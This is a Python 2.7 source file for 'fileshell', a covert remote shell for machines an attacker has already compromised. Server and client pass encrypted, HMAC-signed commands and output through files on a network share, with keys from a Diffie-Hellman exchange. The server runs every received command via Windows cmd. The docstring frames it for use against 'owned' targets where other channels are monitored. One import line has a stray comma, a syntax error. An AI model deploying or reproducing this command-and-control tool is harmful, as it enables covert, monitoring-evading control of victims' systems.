#!/usr/bin/env python

'''
fileshell.py -- a File-IO based remote shell, for use where there is no direct communication
				channel between the attacker and the owned target, but they can communicate
				by writing and reading files to/from a remote share/file server etc, or where other forms 
				of communication are monitored.

				Tested to work on python 2.7.

				Composed of a single client (runs on attacker machine) and one or more servers
				(run on compromised machines). Currently you *must* start the server before running the client!
				Sample workflow:

				1. on host <owned1>, run 'python path\to\fileshell.py \\fileshare\myshare -s
				2. on host <owned2>, run 'python path\to\fileshell.py \\fileshare\myshare -s
				2. on your computer <h4x0r>, run 'python path\to\fileshell.py \\fileshare\myshare -c owned1

				This will look like a usual shell from the client side, but behind the scenes it negotiates
				symmetric encryption and signing keys via DH exchange, then for every command sent and every
				output returned, it encrypts/decrypts via AES-CTR-128 and signs/verifies via HMAC-SHA256
				with the derived keys. 
				All communications, including the key exchange, are done over files	in the given root share
				(the server will create a folder for its target the first time it runs).
				The users (or computer accounts, if running as SYSTEM) running these scripts must have
				read+write+modify access to the given share.

				Features:
				1. Client-server communication starts with a DH handshake for every new session, generating an encryption and a signing key.
				2. All communications after the handshake are AES-128 encrypted with the generated
				encryption key, and signed using HMAC-SHA256 with the signing key.
				3. Client side features shell-like behaviour, with extra commands:
					a. cc <hostname>: changes context (starts new session) to that of hostname.
					b. exit: exits current session gracefully.

				Dependencies:
				1. PyCrypto for Python 2.7 (tested to work on PyCrypto v2.6)
'''


import os
import sys
import threading
import socket
import base64
import hashlib
import time
import subprocess
import binascii,
import hmac
from Crypto.Cipher import AES
from Crypto.Util import Counter

PROMPT = ">"
DH_P = 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff
DH_G = 0x2
IN_FILENAME = "in"
OUT_FILENAME = "out"


############################## START MODULE FUNCTIONS ##############################
def _get_guid_from_name(name):
	if name == None:
		return None

	hashed = name + "crazysalt"

	return binascii.hexlify(hashlib.sha1(hashed).digest())

def _clear_and_write(data, fd):
	'''
	Writes data into the beginning of fd properly.
	'''
	if fd == None or data == None:
		return

	try:
		fd.seek(0)
		fd.truncate()
		fd.write(data)
		fd.flush()
	except ValueError:
		return


def _read_and_clear(fd, event=None):
	'''
	Performs a *blocking* poll on fd to get new data.
	Has optional event argument - when given, blocks only until event is signalled.
	'''
	if fd == None:
		return None

	try:
		fd.seek(0)
		data = ''
		while data == '':
			# Ugly!
			try:
				if event.is_set():
					break
			except AttributeError:
				pass

			data = fd.read()
			time.sleep(0.001)

		fd.seek(0)
		fd.truncate()
		return data
	except ValueError:
		return ''


def _verify_hmac(msg, key):
	# Assume msg was b64decoded prior to calling this
	assert len(msg) > 32
	original_msg = msg[:-32]
	original_hmac = msg[-32:]
	calculated_hmac = hmac.new(key, original_msg, hashlib.sha256).digest()

	# compare_digest() not available, so try timing-insensitive verification
	result = sum([ord(a) ^ ord(b) for (a,b) in zip(original_hmac, calculated_hmac)])
	return result == 0

############################## END MODULE FUNCTIONS ##############################

class AESWrapper():
	def __init__(self, key, mode):
		self.key = key
		if mode == AES.MODE_CTR:
			ctr = Counter.new(128)
			self.aes_inst = AES.new(key, mode, counter=ctr)
		elif mode == AES.MODE_CBC:
			iv = os.urandom(16)
			self.aes_inst = AES.new(key, mode, IV=iv)

	def encrypt(self, msg = None):
		if msg == None:
			return None
		return self.aes_inst.encrypt(msg)

	def decrypt(self, msg = None):
		if msg == None:
			return None
		return self.aes_inst.decrypt(msg)


class FileCommServer():
	'''
	Shell server (owned target) class implementation.
	'''
	def __init__(self, share_path):
		self.share = share_path
		self._guid = self._get_guid()
		self.comm_path = os.path.join(self.share, self._guid)
		self.exec_ctr = 0
		self.session_key, self.sign_key, self.cipher = None, None, None
		print("[*] Initializing:: Server GUID = {}".format((self._guid)))


		self.infile = os.path.join(self.comm_path, IN_FILENAME)
		self.outfile = os.path.join(self.comm_path, OUT_FILENAME)
		if not os.path.exists(self.comm_path):
			os.mkdir(self.comm_path)

		try:
			# Fix for the infinite loop occuring when client starts before server
			# Opening with 'ab+' will create the file if it doesn't exist, and at the 
			# same time not truncate it when closed, which is the behaviour we want.
			self.in_fd = open(self.infile, 'ab+')
			first_data = self.in_fd.read()
			self.in_fd.close()

			self.in_fd = open(self.infile, 'wb+')
			self.out_fd = open(self.outfile, 'wb+')
			_clear_and_write(first_data, self.in_fd)
		except (ValueError, IOError):
			raise


	def _get_guid(self):
		return _get_guid_from_name(socket.gethostname().lower())

	def execute(self):
		try:
			while True:
				in_data = _read_and_clear(self.in_fd)
				if in_data != '':
					if in_data[:2] == 'DH':
						# Key exchange							
						self.session_key, self.sign_key = self._exchange_enc_keys(in_data[2:])
						self.cipher = AESWrapper(self.session_key, AES.MODE_CTR)
					else:
						try:
							in_data = base64.b64decode(in_data)
							verified = _verify_hmac(in_data, self.sign_key)
							if not verified:
								self.write("[**] WARNING: Server received data with incorrect HMAC. Your connection might be tampered with!")
								continue
						except (AssertionError, TypeError):
							self.write("[**] WARNING: Server received data with invalid HMAC or encoding. Your connection might be tampered with!")
							continue

						in_data = self.cipher.decrypt(in_data[:-32])
						writer = threading.Thread(target=self._execute_thread_writer, name=self._guid + "_writer{}".format(self.exec_ctr), args=[in_data])
						writer.start()
						self.exec_ctr += 1

				time.sleep(0.001)
		except (KeyboardInterrupt, SystemExit):
			self.self_destruct()
			raise

	def _execute_thread_writer(self, command_str):
		if self.cipher == None:
			self._clear_and_write("ERR_NO_CIPHER", self.out_fd)
			return

		# Works only on windows hurr durr
		commands = ['cmd', '/c'] + command_str.split()

		try:
			out_data = subprocess.check_output(commands, stderr=subprocess.STDOUT)
		except (subprocess.CalledProcessError, OSError) as e:
			out_data = e.output

		self.write(out_data)


	def write(self, data):
		out_data = self.cipher.encrypt(data)
		data_hmac = hmac.new(self.sign_key, out_data, hashlib.sha256).digest()
		out_data = base64.b64encode(out_data + data_hmac)
		_clear_and_write(out_data, self.out_fd)


	def _exchange_enc_keys(self, material):
		y = binascii.hexlify(os.urandom(len(hex(DH_P))))
		y = int(y, 16) % DH_P
		g_y = pow(DH_G, y, DH_P)

		_clear_and_write("DH" + hex(g_y)[2:], self.out_fd)

		if material[-1] == 'L':
			material = material[:-1]

		g_x = int(material, 16)
		g_xy = pow(g_x, y, DH_P)

		in_data = _read_and_clear(self.in_fd)
		if in_data[:2] != "DH":
			raise Exception("Failure in DH key exchange - received malformed response from server.") 
		if in_data[-1] == 'L':
			in_data = in_data[:-1]

		client_gxy = int(in_data[2:], 16)

		if client_gxy != g_xy:
			_clear_and_write("DH_FAIL_MISMATCHED_KEYS", self.out_fd)
			raise Exception("Failure in DH key exchange - failed to verify identical session keys.")

		_clear_and_write("DHOK", self.out_fd)
		key_parts = hashlib.sha256(hex(g_xy)).digest()
		return key_parts[:16], key_parts[16:]

	def self_destruct(self):
		print("[*] in FileCommServer.self_destruct")
		self.in_fd.close()
		self.out_fd.close()

class FileCommClient():
	def __init__(self, share_path, target_name):
		self.share = share_path
		self._guid = _get_guid_from_name(target_name)
		self.comm_path = os.path.join(self.share, self._guid)
		self.session_key, self.sign_key, self.cipher = None, None, None

		print("[*] Initializing:: Target GUID = {}".format((self._guid)))

		self.infile = os.path.join(self.comm_path, IN_FILENAME)
		self.outfile = os.path.join(self.comm_path, OUT_FILENAME)
		if not os.path.exists(self.comm_path):
			os.mkdir(self.comm_path) # First time use for this root target

		try:
			# Open and close the files first, in order to truncate them.
			self.out_fd = open(self.outfile, 'w').close()
			self.out_fd = open(self.outfile, 'wb+')
			self.in_fd = open(self.infile, 'w').close()
			self.in_fd = open(self.infile, 'wb+')
		except IOError:
			# Insufficient access rights.
			raise

		self.prompt = target_name + PROMPT
		self.session_key, self.sign_key = self._exchange_enc_keys()
		self.cipher = AESWrapper(self.session_key, AES.MODE_CTR)
		return

	def execute(self):
		'''
		Main execution function for the client side.
		1. Creates a thread which polls the 'out' file for changes, and prints any onto the screen
		(any changes are assumed to be the result of the execution of a command).
		2. Emulates a local shell session, parses special commands (cc <hostname>, exit etc.)
		and sends the commands to the server side by writing into the in file.
		# Uses two events for thread communication - one for synchronized shell-like printing,
		the other for terminating the thread when the current session ends.
		'''
		reader_stop_event = threading.Event()
		reader_io_event = threading.Event()
		reader = threading.Thread(target =self._execute_thread_reader, name=self._guid, args=[reader_stop_event, reader_io_event])
		reader.start()

		try:
			while True:
				command_str = raw_input(self.prompt)
				# Next block of code is very unpythonic :(
				if command_str:
					if command_str.startswith("cc "):
						if len(command_str) < 4:
							print("[**] ERROR: Expected cc <hostname>")
							continue
						else:
							# change context to interact with another target machine
							new_target = command_str[3:]
							print("[*] Changing context to {}".format(new_target))

							reader_stop_event.set()
							self.self_destruct()
							return new_target
					elif command_str == "exit":
						# Terminate everything and stop running
						reader_stop_event.set()
						self.self_destruct()
						return ''			

					self.write(command_str)
					reader_io_event.set()
					# Block until current command finishes & data is returned, or KeyboardInterrupt is raised.
					# Uses a threading.Event object (reader_io_event) to signal between threads
					while reader_io_event.is_set():
						time.sleep(0.001)
		except (KeyboardInterrupt, SystemExit):
			reader_stop_event.set()
			self.self_destruct()
			raise
			#return '' # Ugly hack

	def _execute_thread_reader(self, stop_event, io_event):
		while not stop_event.is_set():
			in_data = _read_and_clear(self.out_fd)
			if in_data != '':
				try:
					decrypted_data = base64.b64decode(in_data)
					verified = _verify_hmac(decrypted_data, self.sign_key)
					if not verified:
						print("[**] WARNING: Client received data with incorrect HMAC. Your connection might be tampered with!")
						io_event.clear()
						continue
				except (AssertionError, TypeError):
					print("[**] WARNING: Client received data with invalid HMAC. Your connection might be tampered with!")
					io_event.clear()
					continue

				decrypted_data = self.cipher.decrypt(decrypted_data[:-32])
				print(decrypted_data)

				io_event.clear()
				in_data = ''
			time.sleep(0.001)

	def write(self, data):
		out_data = self.cipher.encrypt(data)
		data_hmac = hmac.new(self.sign_key, out_data, hashlib.sha256).digest()
		out_data = base64.b64encode(out_data + data_hmac)
		_clear_and_write(out_data, self.in_fd)


	def _exchange_enc_keys(self):
		# DH-based key exchange with the server, initiated by the client
		# Remember to check at the end that generated public keys match
		x = binascii.hexlify(os.urandom(len(hex(DH_P))))
		x = int(x, 16) % DH_P
		g_x = pow(DH_G, x, DH_P)

		# Exchange g^x % p, g^y % p (x = client, y = server)
		_clear_and_write("DH" + hex(g_x)[2:], self.in_fd)
		in_data = _read_and_clear(self.out_fd)

		if in_data[:2] != "DH":
			raise Exception("Failure in DH key exchange - received malformed response from server.")

		g_y = in_data[2:]
		if g_y[-1] == 'L':
			g_y = g_y[:-1]

		g_y = int(g_y, 16)
		g_xy = pow(g_y, x, DH_P)

		_clear_and_write("DH" + hex(g_xy)[2:], self.in_fd)
		time.sleep(0.025) #lalalallalala
		in_data = _read_and_clear(self.out_fd)

		if in_data != "DHOK":
			raise Exception("Failure in DH key exchange: {}".format(in_data))

		key_parts = hashlib.sha256(hex(g_xy)).digest()
		return key_parts[:16], key_parts[16:]

	def self_destruct(self):
		print("[*] in FileCommClient.self_destruct")
		self.in_fd.close()
		self.out_fd.close()



class FileShell():
	'''
	Wrapper class for FileCommClient / FileCommServer activation
	'''
	def __init__(self, share_path=None, mode='-c', target_name=None):
		if share_path == None or (target_name == None and mode == '-c'):
			raise ValueError("Must provide share root path and target name")

		if mode == '-c':
			print("[*] Bootstrapping client")
			self.shell_instance = FileCommClient(share_path, target_name)
		elif mode == '-s':
			print("[*] Bootstrapping server")
			self.shell_instance = FileCommServer(share_path)
		else:
			raise Exception("Illegal mode (must be either -c or -s)")

		new_target = None
		while True:
			# If we returned from execute(), means we're running client and were asked to change context
			new_target = self.shell_instance.execute()
			if new_target == '':
				break
			else:
				self.shell_instance = FileCommClient(share_path, new_target)
		return


if __name__ == "__main__":
	if sys.argv == None or len(sys.argv) < 3 or len(sys.argv) > 4:
		print("Usage: FileShell.py share_root {-c [target_name] | -s}") 
		sys.exit(1)

	if len(sys.argv) == 3:
		shell = FileShell(sys.argv[1], sys.argv[2])
	else:
		# len(sys.argv) == 4
		shell = FileShell(sys.argv[1], sys.argv[2], sys.argv[3])

	if shell == None:
		print("Error while initializing shell. Exiting..")
		sys.exit(1)

	sys.exit(0)